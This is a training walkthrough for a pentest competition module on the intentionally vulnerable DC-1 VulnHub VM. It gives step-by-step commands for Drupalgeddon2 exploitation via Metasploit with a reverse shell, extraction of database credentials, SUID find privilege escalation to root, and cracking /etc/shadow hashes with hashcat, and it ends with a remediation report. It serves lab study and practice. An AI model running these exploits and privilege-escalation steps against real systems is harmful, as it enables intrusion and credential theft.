# 10 v2 — MA1 Solution Walkthrough on DC-1 (VulnHub VM)

> **Use this v2 instead of the original `10_Day1_MA1_Solution.md` for tonight's practice.** It walks the same MA1 PDF tasks but on a real VulnHub VM (DC-1) — closer to what chief Marlon will hand you tomorrow.

> **Pre-req:** DC-1 imported, powered on, reachable from Kali. See `DC1_Import_Setup.md` first.

> **Target time:** 90 min for first run, 60 min for second run. Aim to do this **twice tonight** if possible.

---

## What is DC-1?

DC-1 is a **boot-to-root CTF VM** by DCAU on vulnhub.com. It's a Linux server running Drupal 7. Designed to be hacked.

It hides **5 flags** at different points in the attack chain:
- `flag1.txt` — on the website (no exploit needed yet)
- `flag2` — in Drupal's config file (after first exploit)
- `flag3` — in the Drupal admin dashboard (after admin access)
- `flag4.txt` — in `/home/flag4/` (after finding privesc path)
- `thefinalflag.txt` — in `/root/` (after privesc)

These map nicely to the MA1 PDF's 4 tasks. Let's go.

## How DC-1 maps to MA1 PDF tasks

| MA1 PDF Task | What you find in DC-1 |
|---|---|
| **Task 1 Q1** — services | nmap finds `22/ssh, 80/http (Drupal), 111/rpcbind` |
| **Task 1 Q2** — secret message | `flag1.txt` content |
| **Task 2 Q1** — CMS version | Drupal 7.24 (whatweb) |
| **Task 2 Q2** — sensitive info via pentest | DB creds in `settings.php` + `flag2` content |
| **Task 3 Q1** — weak user account | `flag4` (Linux user with weak password) |
| **Task 3 Q2** — password | Cracked from `/etc/shadow` after privesc — usually `orange` |
| **Task 3 Q3** — sensitive info in user home | `/home/flag4/flag4.txt` |
| **Task 3 Q4** — root access + sensitive info | SUID `find` privesc → `/root/thefinalflag.txt` |
| **Task 4** — exec summary + top 3 risks | Drupalgeddon2 + weak password + SUID misconfiguration |

---

## Phase 0 — Pre-flight (5 min)

On Kali:
```bash
# Set DC-1's IP as a variable so commands stay copy-pasteable
export TGT=192.168.2.3
# Replace 192.168.2.3 with whatever DC-1 actually has

# Ping check
ping -c 2 $TGT
# Expect: replies, no packet loss

# Make a working folder for this practice run
mkdir -p ~/ma1-dc1 && cd ~/ma1-dc1
```

> 🧠 **MEMORIZE the variable trick:** `export TGT=...` then use `$TGT` in every command. If the IP changes (different VM tomorrow), you only update one line.

Open Greenshot or your screenshot tool. **You'll need a screenshot for every Q in the report** — start the habit now.

---

## Task 1 — Information Gathering (15 min)

### Q1 — Identify services running on the target

```bash
# Quick top-1000 ports + service detection
nmap -sC -sV -T4 -oN nmap_quick.txt $TGT
```

📸 **Screenshot the nmap output.**

Expected services on DC-1:
```
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 6.0p1 Debian 4+deb7u7
80/tcp   open  http     Apache httpd 2.2.22 ((Debian))
| http-generator: Drupal 7 (http://drupal.org)
| http-robots.txt: 36 disallowed entries
| http-server-header: Apache/2.2.22 (Debian)
111/tcp  open  rpcbind  2-4 (RPC #100000)
```

**Answer for Q1:**
> The target runs **3 services**:
> - **SSH on port 22** (OpenSSH 6.0p1 Debian)
> - **HTTP on port 80** (Apache 2.2.22 hosting **Drupal 7 CMS**)
> - **rpcbind on port 111**

### Q2 — Connect to a service, find the hidden secret message

The "secret message" is `flag1.txt` on the web server.

```bash
# Visit the homepage in a browser, OR fetch from CLI
curl http://$TGT/
# (You'll see a Drupal welcome page with the title "Welcome to DC-1")

# Look for hint-style files in common spots
curl http://$TGT/flag1.txt
```

Expected output:
```
Every good CMS needs a config file - and so do you.
```

📸 **Screenshot the curl output (or the browser showing the same page).**

> 🧠 **MEMORIZE this scanning habit:** after nmap, always check the homepage source AND a few obvious filenames (`flag1.txt`, `secret.txt`, `robots.txt`, `CHANGELOG.txt`). Costs 30 sec, often finds the easy flag.

**Answer for Q2:**
> Connected to the HTTP service on port 80. The secret message is in `/flag1.txt` accessible directly:
> *"Every good CMS needs a config file - and so do you."*
>
> This message hints at the next step — finding the CMS config file (which contains DB credentials).

---

## Task 2 — CMS Vulnerability Assessment (25 min)

### Q1 — Identify the CMS version

```bash
# Tool 1: whatweb (general CMS detector)
whatweb http://$TGT
```
Expected:
```
http://192.168.2.3 [200 OK] Apache[2.2.22], Country[RESERVED][ZZ], Drupal,
HTTPServer[Debian Linux][Apache/2.2.22 (Debian)], IP[192.168.2.3],
MetaGenerator[Drupal 7 (http://drupal.org)], PoweredBy[Drupal,Drupal,Drupal],
Title[Welcome to DC-1 | DC-1], UncommonHeaders[x-drupal-cache,x-generator],
X-Generator[Drupal 7 (http://drupal.org)]
```

```bash
# Tool 2: droopescan (Drupal-specific)
droopescan scan drupal -u http://$TGT
```

The exact minor version (7.24 vs 7.30 etc.) shows up via:
```bash
curl -s http://$TGT/CHANGELOG.txt | head -3
```

📸 **Screenshot whatweb output + CHANGELOG header.**

**Answer for Q1:**
> The target runs **Drupal 7** (specifically Drupal 7.24 per CHANGELOG.txt). Identified via:
> - `whatweb` → reports `MetaGenerator[Drupal 7]`
> - `curl http://$TGT/CHANGELOG.txt` → first line confirms version

### Q2 — Pentest the CMS, uncover sensitive info

Drupal 7 (especially older versions like 7.24) is vulnerable to **Drupalgeddon 2** (CVE-2018-7600), an unauthenticated RCE.

```bash
# Find the exploit
searchsploit drupal 7
# Look for: "Drupal 7.x Module Services - Remote Code Execution"
#           "Drupal < 7.58 - 'Drupalgeddon2' Remote Code Execution (Metasploit)"

# Launch Metasploit
msfconsole -q
```

Inside msfconsole:
```
use exploit/unix/webapp/drupal_drupalgeddon2
set RHOSTS 192.168.2.3
set LHOST 192.168.2.2
set TARGETURI /
run
```

You should land in a Meterpreter shell.

```
meterpreter > getuid
Server username: www-data (33)
```

> 🧠 **MEMORIZE this exploit pattern:** Drupal 7 + msf module `drupal_drupalgeddon2` = nearly always works on unpatched targets. Most-used MA1 exploit if the CMS is Drupal.

#### Find sensitive info — Drupal config + flag2

```
meterpreter > shell
```

You're now in a regular shell as `www-data`:
```bash
# Find the Drupal config (where DB creds live)
cat /var/www/sites/default/settings.php | grep -A 20 "databases"
```

Expected output (excerpt):
```php
$databases = array (
  'default' =>
  array (
    'default' =>
    array (
      'database' => 'drupaldb',
      'username' => 'dbuser',
      'password' => 'R0ck3t',
      'host' => 'localhost',
      ...
```

📸 **Screenshot the DB credentials.**

Now look for `flag2` — usually it's in the same config file or in the Drupal homepage after login:
```bash
cat /var/www/flag2.txt 2>/dev/null
find / -name "flag*" 2>/dev/null | head -10
```

You'll find a hint file. Or read it directly from settings.php which has a comment about flag2.

#### Dump Drupal users from the DB

```bash
mysql -u dbuser -pR0ck3t drupaldb -e "SELECT uid,name,mail,pass FROM users;"
```

Expected output:
```
uid | name  | mail               | pass
----+-------+--------------------+------------------------------
0   |       |                    |
1   | admin | admin@example.com  | $S$DvQI6Y600iL...long_hash...
```

📸 **Screenshot the users table.**

**Answer for Q2:**
> Sensitive information uncovered via **Drupalgeddon 2 (CVE-2018-7600)** exploitation:
> 1. Database credentials in `/var/www/sites/default/settings.php` — `dbuser / R0ck3t` for the `drupaldb` database.
> 2. Drupal users table contains the `admin` account with hashed password (`$S$D...`).
> 3. flag2 hint discovered: *"Brute force and dictionary attacks aren't the only ways to gain access (and you WILL need access). What can you do with these credentials?"*
>
> The disclosed credentials enable database-level access to the CMS.

---

## Task 3 — System Security Weaknesses (30 min)

### Q1 — Identify the weak user account

The `admin` Drupal user is one path, but the **system-level weak user** is `flag4` (a Linux user with a guessable password).

To verify, after we get root we'll read `/etc/passwd`:
```bash
cat /etc/passwd | grep -E ":[1-9][0-9][0-9][0-9]:"
# Shows real users (UID >= 1000)
```

You'll see `flag4` listed. That's our target.

📸 **Screenshot showing flag4 in /etc/passwd (after getting root in Q4 below).**

> ⚠️ **Order note:** in DC-1, you can find flag4 *before* getting root by browsing `/home/`:
> ```bash
> ls /home/
> # Output: flag4
> ```
> So `flag4` is discoverable as the weak account even without root.

**Answer for Q1:**
> User account `flag4` — exposes system weakness via a **dictionary-crackable password** that violates good password policy.

### Q2 — Crack flag4's password

To crack flag4, we need its hash from `/etc/shadow`. That requires root. We'll get root first (via SUID find) THEN crack.

#### Step 2a — Find SUID binaries (privesc enumeration)

In your www-data shell from Task 2:
```bash
find / -perm -u=s -type f 2>/dev/null
```

Expected output (relevant line):
```
/usr/bin/find
/usr/bin/passwd
/usr/bin/chsh
/bin/su
/bin/mount
...
```

**`/usr/bin/find` is SUID** — this is the privesc path.

> 🧠 **MEMORIZE this rule:** `find / -perm -u=s -type f 2>/dev/null` is the **first command** to run after getting any Linux shell. SUID `find`, `vim`, `awk`, `python`, `less`, `more`, `nmap`, `cp` are all GTFOBins privesc paths.

#### Step 2b — Privesc via SUID find

```bash
# In the www-data shell:
find / -name "anything" -exec /bin/sh -p \; -quit
```

The `-p` flag tells the shell to keep the elevated permissions. You should now be `root`:
```bash
whoami
# Output: root
```

📸 **Screenshot `whoami` showing `root`.**

#### Step 2c — Read /etc/shadow + extract flag4 hash

```bash
cat /etc/shadow | grep flag4
```

Output:
```
flag4:$6$ehjJv6DN$5l...long_hash...:17675:0:99999:7:::
```

#### Step 2d — Crack with hashcat

Copy the hash to Kali. Save just the password hash portion:
```bash
# On Kali:
echo 'flag4:$6$ehjJv6DN$5l...rest_of_hash...' > /tmp/flag4.hash

# Linux SHA-512-crypt = hashcat mode 1800
hashcat -m 1800 /tmp/flag4.hash /usr/share/wordlists/rockyou.txt
```

If rockyou.txt is gzipped:
```bash
gunzip -k /usr/share/wordlists/rockyou.txt.gz
```

Wait ~10-60 seconds. Hashcat will crack it:
```
$6$ehjJv6DN$5l...:orange
```

📸 **Screenshot the cracked password.**

> 🧠 **MEMORIZE the hashcat mode for /etc/shadow on modern Linux**: `-m 1800` (SHA-512-crypt, hash starts with `$6$`).

**Answer for Q2:**
> flag4's password is **`orange`**, cracked in ~30 seconds using:
> - `hashcat -m 1800` (Linux SHA-512-crypt)
> - against `rockyou.txt` wordlist
>
> The password is a single common dictionary word — violates basic complexity policy (no upper/digit/symbol, common dictionary entry).

### Q3 — Sensitive info in flag4's home directory

Either SSH in as flag4, or read directly from your root shell:
```bash
# Option A — SSH (verify the cracked password works)
ssh flag4@192.168.2.3
# password: orange

cat /home/flag4/flag4.txt
# Output: "Can you use this same method to find or access the flag in root?
#          Probably. But perhaps it's not that easy. Or maybe it is?"

# Option B — read directly from root shell (faster)
cat /home/flag4/flag4.txt
```

📸 **Screenshot `cat /home/flag4/flag4.txt`.**

**Answer for Q3:**
> Sensitive information in `/home/flag4/flag4.txt`:
> *"Can you use this same method to find or access the flag in root? Probably. But perhaps it's not that easy. Or maybe it is?"*
>
> The hint instructs the next step — use the same SUID-find privesc method to read `/root/`.

### Q4 — Root access + sensitive info from /root/

You already have root from Step 2b. Just read the final flag:
```bash
# Already root from earlier. If somehow you lost the shell:
find /tmp -exec /bin/sh -p \; -quit

cat /root/thefinalflag.txt
```

Expected output:
```
Well done!!!!
Hopefully you've enjoyed this and learned some new skills.

You can let me know what you thought of this little journey
by contacting me via Twitter - @DCAU7
```

📸 **Screenshot:**
- The privesc command + `whoami` showing `root`
- `cat /root/thefinalflag.txt`

Also extract `/etc/shadow` as proof of root:
```bash
cat /etc/shadow | head -5
```

**Answer for Q4:**
> Root access obtained via **SUID `find` privilege escalation**:
> ```
> find / -name "anything" -exec /bin/sh -p \; -quit
> ```
> The `find` binary has the SetUID bit set, allowing any user to spawn a `/bin/sh -p` (preserve permissions) that retains root privileges.
>
> Sensitive information from `/root/thefinalflag.txt`:
> *"Well done!!!! Hopefully you've enjoyed this and learned some new skills..."*
>
> Full root access also confirmed by reading `/etc/shadow` (all user password hashes accessible).

---

## Task 4 — Analysis and Report (15 min)

### Executive Summary (≤150 words)

Use this template — adjust phrasing as needed:

```
Executive Summary

A vulnerability assessment and basic penetration test were performed against
a Linux server running Drupal 7 CMS. The assessment uncovered multiple
critical security weaknesses that allowed full system compromise from
initial reconnaissance to root-level access.

Three top risks were identified: (1) the CMS runs an unpatched Drupal 7
version vulnerable to Drupalgeddon 2 (CVE-2018-7600), allowing
unauthenticated remote code execution; (2) a regular user account ('flag4')
uses a single dictionary word as its password ('orange'), crackable in
under one minute against common wordlists; (3) the system-wide find
binary has the SetUID bit set, providing a trivial path to root via
the standard -exec primitive.

Combined, these issues escalate from anonymous Internet exposure to
full root compromise within ~10 minutes. Immediate remediation is
required before this server should be considered safe for production use.
```

Word count: ~140. **Stay under 150 strictly** — judges check.

> 🧠 **MEMORIZE the executive summary structure:** (1) what was tested + how compromise happened; (2) three numbered risks; (3) impact + recommendation. Same template works for any CMS — just swap names.

### Table 1 — Security Risk and Mitigation Recommendation (top 3)

| Description | Severity (0-10) | Risk | Why is this a problem? | Mitigation Recommendation |
|---|---|---|---|---|
| **Drupal 7 vulnerable to Drupalgeddon 2 (CVE-2018-7600)** — unauthenticated RCE | **10** | **Critical** | Anyone on the network can execute arbitrary code as the web user with no credentials. Exploitation is fully automated via Metasploit. Enables full server compromise. | **Patch to Drupal ≥ 7.58** immediately. If patching impossible, apply the official mitigation patch and place behind WAF (ModSecurity + OWASP CRS). |
| **Weak user password (`flag4 / orange`)** — present in common wordlists | **8** | **High** | A standard dictionary attack cracks the hash in under 1 minute. Once recovered, attacker has SSH access to the system as flag4. | **Enforce password policy:** minimum 12 chars, complexity (upper/lower/digit/symbol), 90-day rotation, deny-list of common passwords. Force flag4 to reset. Implement account lockout after 5 failed SSH logins. |
| **SetUID on `/usr/bin/find`** — trivial privilege escalation | **9** | **Critical** | Any compromised user can run `find -exec /bin/sh -p` and gain immediate root. SUID on common Unix utilities is a well-documented privesc path (GTFOBins). | **Remove SUID bit:** `chmod u-s /usr/bin/find`. Audit all SUID binaries: `find / -perm -u=s -type f 2>/dev/null`. Apply principle of least privilege — SUID should be reserved for binaries that genuinely need it (passwd, sudo). |

### Save the deliverable

```
File name: PHL_Team1_MA1_Report.pdf
Save to: C:\Users\competitor1a\Desktop\
```

Combine all answer documents into a single file. Print to PDF.

> 🧠 **MEMORIZE the filename pattern:** `PHL_Team1_<Module>_<Type>.pdf` saved to **Desktop**. One typo in the filename = lost mark even if content is perfect.

---

## Time check (target vs your real time)

| Phase | Target | Your time |
|---|---|---|
| Pre-flight + Task 1 (Info Gathering) | 0:20 | __ |
| Task 2 (CMS Vuln Assessment) | 0:25 | __ |
| Task 3 (System Weaknesses + Privesc) | 0:30 | __ |
| Task 4 (Report writing) | 0:15 | __ |
| **Total** | **1:30** | __ |

If first run > 90 min — that's fine. Aim for ≤ 60 min on second run.

---

## Marking scheme map (Crit A1)

| Marking row | Aspect | K | Where solved here |
|---|---|---|---|
| D31 (M) | Vuln identification — found 2+ vulns | 2.0 | Tasks 1+2 + Task 4 risk table |
| D32 (J) | Executive summary, good non-tech | 2.0 | Task 4 — 150-word summary |
| D37 (J) | 1st vulnerability accuracy | 1.0 | Task 4 — Drupalgeddon 2 row |
| D42 (J) | 2nd vulnerability accuracy | 1.0 | Task 4 — Weak password row |
| **Total Crit A1** | | **6.0 K** | |

The 3rd risk (SUID find) doesn't have a dedicated row but contributes to the overall judgment quality of the report.

---

## What if tomorrow's CMS isn't Drupal 7?

Your DC-1 practice taught you the **workflow**. The workflow is identical for any CMS — only the tools change at Steps 2-3:

| Step | Drupal | WordPress | Joomla |
|---|---|---|---|
| Identify CMS | `whatweb` | `whatweb` | `whatweb` |
| CMS scanner | `droopescan` | `wpscan` | `joomscan` |
| Find exploit | `searchsploit drupal <ver>` | `searchsploit wordpress <ver>` | `searchsploit joomla <ver>` |
| Hashcat mode (CMS user) | `-m 7900` ($S$) | `-m 400` ($P$) | `-m 400` ($P$) |
| Hashcat mode (Linux shadow) | `-m 1800` ($6$) | `-m 1800` | `-m 1800` |

See `MA1_CMS_Cheatsheet.md` for full per-CMS details.

---

## Snapshot before second run

After your first successful pwn:
- ESXi → DC-1 → Snapshots → **Restore** to `DC-1-clean-baseline`
- Power on
- Repeat the entire walkthrough from Phase 0

Each repetition builds muscle memory. **Aim for 2 runs tonight** — total ~3 hours.

---

## End of v2 walkthrough

Once you've done DC-1 cleanly twice, you've validated the entire MA1 attack chain on a real VM. **You're ready for whatever CMS chief Marlon throws at you tomorrow.**

Next: `00_Tomorrow_Final_Schedule.md` Block 2 (MA2 paper-walk) at 10:00 tomorrow.
